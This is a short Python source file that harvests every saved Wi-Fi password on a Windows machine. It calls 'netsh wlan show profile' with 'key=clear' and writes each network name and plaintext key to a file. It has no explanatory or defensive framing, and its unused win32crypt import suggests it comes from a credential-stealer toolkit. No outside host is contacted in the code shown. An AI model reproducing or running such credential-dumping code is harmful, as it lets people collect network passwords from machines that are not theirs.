import os
import win32crypt
import re
import xml.etree.ElementTree as ET

class wifi_password:
    def __init__(self, file_path):
        wifi_creds = []
        output = os.popen("netsh wlan show profile").read().strip()
        network_names = re.findall(r"All User Profile\s*:\s*(.+)", output)
        for name in network_names:
            info = os.popen(f"netsh wlan show profile \"{name}\" key=clear").read()
            match = re.search(r"Key Content\s*:\s*(.+)", info)
            password = match.group(1) if match else "N/A"

            
            wifi_creds.append([name, password])

        with open(file_path, 'w') as f:
            f.write("-" * 50)
            f.write("\n WIFI PASSWORDS\n")
            f.write("-" * 50)

            for credential in wifi_creds:
                f.write(f"\nName: {credential[0]}\nPassword: {credential[1]}")


        
        
